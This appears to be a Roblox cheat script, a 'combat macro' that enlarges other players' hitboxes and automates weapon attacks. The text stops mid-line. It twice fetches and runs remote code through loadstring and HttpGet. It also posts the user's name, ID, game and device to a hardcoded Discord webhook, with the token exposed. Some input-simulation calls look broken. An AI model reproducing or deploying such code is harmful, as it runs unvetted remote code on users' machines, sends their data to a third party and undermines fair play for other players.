local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")

local player = Players.LocalPlayer
local Character = player.Character or player.CharacterAdded:Wait()
local Humanoid = Character:WaitForChild("Humanoid")
local RootPart = Character:WaitForChild("HumanoidRootPart")
local GameID = game.PlaceId
local PlayerName = player.Name
local PlayerID = player.UserId

-- 📡 WEBHOOK
local WebhookURL = "https://discord.com/api/webhooks/1484224630465233080/nnuq3IeN8iVyWZJKoyJ8nRtG7pNgStp0HpM1VxfjZk5hN0kCMqg5UxFThOHpD_gpcOIe"
local function SendWebhook(title, message)
    local data = {
        embeds = {{
            title = "🚀 "..title,
            description = message,
            color = 65535,
            fields = {
                {name = "👤 Username", value = "`"..PlayerName.."`", inline = true},
                {name = "🆔 User ID", value = "`"..PlayerID.."`", inline = true},
                {name = "🎮 Game ID", value = "`"..GameID.."`", inline = true},
                {name = "📱 Device", value = "`"..(UserInputService.TouchEnabled and "Mobile" or "PC").."`", inline = true}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    pcall(function() HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson) end)
end

-- 🎨 THEME
local Theme = {
    BG = Color3.fromRGB(10, 10, 15),
    Panel = Color3.fromRGB(20, 20, 30),
    Primary = Color3.fromRGB(0, 200, 255),
    Secondary = Color3.fromRGB(100, 100, 255),
    Text = Color3.fromRGB(255, 255, 255)
}

-- ⚙️ SETTINGS
local Settings = {
    -- HITBOX
    HitboxEnabled = false,
    ShowVisuals = true,
    HitboxSize = 18,
    HitboxColor = Color3.new(0, 0.8, 1),
    OriginalSizes = {},

    -- POV CAMERA
    POVEnabled = false,
    Distance = 9,
    Height = 4,
    FOV = 70,

    -- WEAPON COMBO
    ComboEnabled = false,
    ComboSpeed = 0.12,
    SelectedWeapons = {
        ["Glitter Bomb"] = true,
        ["Ghostly Gloves"] = true,
        ["Scythe"] = true,
        ["Spiked Knuckles"] = true,
        ["Ice Crown Queen"] = true,
        ["Trident"] = true,
        ["Ice Katana"] = true,
        ["Cupid's Bow"] = true,
        ["Love Me Hate Me Taser"] = true,
        ["Loveboard"] = true,
        ["Spiked Kitty Stanli"] = true,
        ["Kitty Purse"] = true,
        ["Spiked Purse"] = true,
        ["Nightmare Purse"] = true,
        ["Shiny Purse"] = true,
        ["Freeze Gun"] = true,
        ["Brass Knuckles"] = true,
        ["Chain Mace"] = true,
        ["Chainsaw"] = true,
        ["Champion Gloves"] = true,
        ["Crowbar"] = true,
        ["Fan of Requiem"] = true,
        ["Sakura Blade"] = true,
        ["Nunchucks"] = true,
        ["Sledgehammer"] = true,
        ["Harpoon"] = true,
        ["Snowball Launcher"] = true,
        ["Gravity Gun"] = true,
        ["Axe"] = true,
        ["Poison Knuckles"] = true,
        ["Roller Skates"] = true,
        ["Santa's RPG"] = true
    },

    -- ❄️ SNOWBALL LAUNCHER
    SnowballAuto = false,
    ShootDelay = 0.5
}

-- ✨ LOADING SCREEN
local Loader = Instance.new("ScreenGui")
Loader.Name = "MacroLoader"
Loader.ResetOnSpawn = false
Loader.Parent = player.PlayerGui
Loader.IgnoreGuiInset = true
Loader.ZIndexBehavior = Enum.ZIndexBehavior.Global

local MainBG = Instance.new("Frame")
MainBG.Size = UDim2.new(1, 0, 1, 0)
MainBG.BackgroundColor3 = Theme.BG
MainBG.BorderSizePixel = 0
MainBG.Parent = Loader

local Center = Instance.new("Frame")
Center.Size = UDim2.new(0, 700, 0, 450)
Center.Position = UDim2.new(0.5, -350, 0.5, -225)
Center.BackgroundTransparency = 1
Center.Parent = MainBG

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 100)
Title.Position = UDim2.new(0, 0, 0, 20)
Title.BackgroundTransparency = 1
Title.Text = "COMBAT MACRO"
Title.TextColor3 = Theme.Text
Title.TextScaled = true
Title.Font = Enum.Font.GothamBlack
Title.Parent = Center

local SubTitle = Instance.new("TextLabel")
SubTitle.Size = UDim2.new(1, 0, 0, 40)
SubTitle.Position = UDim2.new(0, 0, 0.22, 0)
SubTitle.BackgroundTransparency = 1
SubTitle.Text = "v3.0 • FULL FEATURES"
SubTitle.TextColor3 = Theme.Primary
SubTitle.TextScaled = true
SubTitle.Font = Enum.Font.Gotham
SubTitle.Parent = Center

local BarOutline = Instance.new("Frame")
BarOutline.Size = UDim2.new(0, 600, 0, 28)
BarOutline.Position = UDim2.new(0.5, -300, 0.55, 0)
BarOutline.BackgroundColor3 = Theme.Panel
BarOutline.BorderSizePixel = 0
BarOutline.Parent = Center

local BarCorner = Instance.new("UICorner")
BarCorner.CornerRadius = UDim.new(1, 0)
BarCorner.Parent = BarOutline

local ProgressBar = Instance.new("Frame")
ProgressBar.Size = UDim2.new(0, 0, 1, 0)
ProgressBar.BackgroundColor3 = Theme.Primary
ProgressBar.BorderSizePixel = 0
ProgressBar.Parent = BarOutline

local BarFill = Instance.new("UICorner")
BarFill.CornerRadius = UDim.new(1, 0)
BarFill.Parent = ProgressBar

local PercentText = Instance.new("TextLabel")
PercentText.Size = UDim2.new(0, 150, 0, 40)
PercentText.Position = UDim2.new(0.5, -75, 0.65, 0)
PercentText.BackgroundTransparency = 1
PercentText.Text = "0%"
PercentText.TextColor3 = Theme.Text
PercentText.TextScaled = true
PercentText.Font = Enum.Font.GothamBold
PercentText.Parent = Center

local StatusText = Instance.new("TextLabel")
StatusText.Size = UDim2.new(1, 0, 0, 30)
StatusText.Position = UDim2.new(0, 0, 0.78, 0)
StatusText.BackgroundTransparency = 1
StatusText.Text = "Loading Assets..."
StatusText.TextColor3 = Color3.fromRGB(180, 180, 180)
StatusText.TextScaled = true
StatusText.Font = Enum.Font.Gotham
StatusText.Parent = Center

-- ⚡ LOADING ANIMATION
local LoadTime = 8
local Elapsed = 0
local StatusMessages = {"Initializing...", "Loading Features...", "Setting Up System...", "Almost Ready..."}
local Conn

Conn = RunService.RenderStepped:Connect(function(delta)
    Elapsed += delta
    local Prog = math.min(Elapsed / LoadTime, 1)
    ProgressBar.Size = UDim2.new(Prog, 0, 1, 0)
    PercentText.Text = math.floor(Prog * 100).."%"
    
    if Prog < 0.25 then
        StatusText.Text = StatusMessages[1]
    elseif Prog < 0.5 then
        StatusText.Text = StatusMessages[2]
    elseif Prog < 0.8 then
        StatusText.Text = StatusMessages[3]
    else
        StatusText.Text = StatusMessages[4]
    end
    
    if Prog >= 1 then
        Conn:Disconnect()
        local Fade = TweenInfo.new(1.2, Enum.EasingStyle.Quad)
        TweenService:Create(MainBG, Fade, {BackgroundTransparency = 1}):Play()
        TweenService:Create(Title, Fade, {TextTransparency = 1}):Play()
        TweenService:Create(SubTitle, Fade, {TextTransparency = 1}):Play()
        TweenService:Create(BarOutline, Fade, {BackgroundTransparency = 1}):Play()
        TweenService:Create(PercentText, Fade, {TextTransparency = 1}):Play()
        TweenService:Create(StatusText, Fade, {TextTransparency = 1}):Play()
        task.wait(1.5)
        Loader:Destroy()
        LoadMainGUI()
    end
end)

-- 🛠️ CORE FUNCTIONS
local function Click()
    pcall(function()
        local Mouse = player:GetMouse()
        Mouse:Button1Down()
        task.wait(0.05)
        Mouse:Button1Up()
    end)
end

-- 📦 HITBOX SYSTEM
local function SaveOriginalSizes()
    table.clear(Settings.OriginalSizes)
    for _, Target in pairs(Players:GetPlayers()) do
        if Target ~= player and Target.Character and Target.Character:FindFirstChild("Humanoid") and Target.Character.Humanoid.Health > 0 then
            local HRP = Target.Character:FindFirstChild("HumanoidRootPart")
            if HRP and not Settings.OriginalSizes[HRP] then
                Settings.OriginalSizes[HRP] = HRP.Size
            end
        end
    end
end

local function UpdateHitbox()
    SaveOriginalSizes()
    for HRP, _ in pairs(Settings.OriginalSizes) do
        if HRP and HRP.Parent and HRP.Parent:FindFirstChild("Humanoid") then
            HRP.Size = Vector3.new(Settings.HitboxSize, Settings.HitboxSize, Settings.HitboxSize)
            HRP.CanCollide = false
            HRP.Transparency = Settings.ShowVisuals and 0.7 or 1
            HRP.Color = Settings.HitboxColor
        end
    end
end

local function ResetHitbox()
    for HRP, OriginalSize in pairs(Settings.OriginalSizes) do
        if HRP and HRP.Parent then
            HRP.Size = OriginalSize
            HRP.Transparency = 0
            HRP.Color = Color3.new(1, 1, 1)
            HRP.CanCollide = true
        end
    end
    table.clear(Settings.OriginalSizes)
end

-- 🎥 POV CAMERA
local function UpdatePOV()
    local Camera = Workspace.CurrentCamera
    if Settings.POVEnabled then
        Camera.CameraType = Enum.CameraType.Scriptable
        TweenService:Create(Camera, TweenInfo.new(0.5), {
            CFrame = RootPart.CFrame * CFrame.new(0, Settings.Height, -Settings.Distance),
            FieldOfView = Settings.FOV
        }):Play()
    else
        Camera.CameraType = Enum.CameraType.Custom
        Camera.FieldOfView = 70
    end
end

-- ⚔️ WEAPON COMBO
local function RunCombo()
    if not Settings.ComboEnabled or not Character or Humanoid.Health <= 0 then return end

    for WeaponName, Enabled in pairs(Settings.SelectedWeapons) do
        if Enabled then
            local Tool = player.Backpack:FindFirstChild(WeaponName) or Character:FindFirstChildOfClass("Tool")
            if Tool then
                Character.Humanoid:EquipTool(Tool)
                task.wait(0.1)
                Click()
                task.wait(Settings.ComboSpeed)
            end
        end
    end
end

-- ❄️ SNOWBALL AUTO SHOOT
local function SnowballShoot()
    if not Settings.SnowballAuto or not Character or Humanoid.Health <= 0 then return end

    local Tool = Character:FindFirstChildOfClass("Tool")
    if Tool and Tool.Name == "Snowball Launcher" then
        Click()
        task.wait(0.1)
        UserInputService:InputBegan({KeyCode = Enum.KeyCode.X, UserInputType = Enum.UserInputType.Keyboard}, true)
        task.wait(0.05)
        UserInputService:InputEnded({KeyCode = Enum.KeyCode.X, UserInputType = Enum.UserInputType.Keyboard}, true)
        Click()
    end
end

-- 🧍 RESPAWN HANDLER
player.CharacterAdded:Connect(function(NewChar)
    Character = NewChar
    Humanoid = NewChar:WaitForChild("Humanoid")
    RootPart = NewChar:WaitForChild("HumanoidRootPart")
    ResetHitbox()
end)

-- ⚙️ FEATURE LOOPS
task.spawn(function()
    while true do
        if Settings.HitboxEnabled then UpdateHitbox() else ResetHitbox() end
        task.wait(0.3)
    end
end)

task.spawn(function()
    while true do
        UpdatePOV()
        task.wait(0.1)
    end
end)

task.spawn(function()
    while true do
        RunCombo()
        task.wait(0.1)
    end
end)

task.spawn(function()
    while true do
        SnowballShoot()
        task.wait(Settings.ShootDelay)
    end
end)

-- 🖥️ MAIN GUI
function LoadMainGUI()
    local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
    local Window = Rayfield:CreateWindow({
        Name = "⚡ COMBAT MACRO • v3.0",
        LoadingTitle = "SYSTEM READY",
        LoadingSubtitle = "by Legitness",
        ConfigurationSaving = {Enabled = false},
        Discord = {Enabled = false},
        KeySystem = false
    })

    -- TABS
    local MainTab = Window:CreateTab("🏠 Main", 4483362458)
    local HitboxTab = Window:CreateTab("📦 Hitbox Extender", 4483362458)
    local POVTab = Window:CreateTab("🎥 POV Camera", 4483362458)
    local ComboTab = Window:CreateTab("⚔️ Weapon Combo", 4483362458)
    local SpecialTab = Window:CreateTab("❄️ Special Features", 4483362458)
    local CreditsTab = Window:CreateTab("📜 Credits", 4483362458)

    -- 🏠 MAIN TAB
    MainTab:CreateSection("MAIN CONTROLS")
    MainTab:CreateButton({
        Name = "🚀 ACTIVATE MACRO SCRIPT",
        Callback = function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/macrobestscript/baddies/refs/heads/main/baddies", true))()
            SendWebhook("SCRIPT ACTIVATED", "All features have been successfully enabled!")
            Rayfield:Notify({
                Title = "✅ SUCCESS!",
                Content = "Script Activated & Notification Sent!",
                Duration = 3
            })
        end
    })

    -- 📦 HITBOX TAB
    HitboxTab:CreateSection("SETTINGS")
    HitboxTab:CreateToggle({
        Name = "Enable Hitbox Extender",
        CurrentValue = Settings.Hit
